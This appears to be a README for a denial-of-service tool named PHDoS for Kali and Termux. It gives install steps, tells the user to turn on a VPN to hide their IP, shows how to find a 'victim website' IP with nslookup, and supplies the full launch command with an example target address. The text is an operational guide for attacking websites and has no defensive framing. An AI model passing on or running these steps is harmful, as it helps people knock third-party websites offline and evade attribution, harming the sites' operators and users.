Kali & Termux Compatible<br>
Requirements:<br>
$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install python2<br>
$ apt install python3<br>
$ apt install git<br>
$ apt install dnsutils<br>
$ git clone https://github.com/5inco/PHDoS

First you need to activate a vpn to change your ip

You need the <b>IP Address</b> of a website which you want to attack...<br>
New Terminal just type:<br>
$ <b>nslookup victimwebsite.com<b><br>
Get the IP Address of a victim website<br>

Installation & Usage:<br>
$ cd PHDoS/<br>
$ ls<br>
$ python3 phdos.py -s [Victim ip Address] -p 80 -t 135<br>
example:<br>
$ python3 phdos.py -s 35.240.181.176 -p 80 -t 135<br>

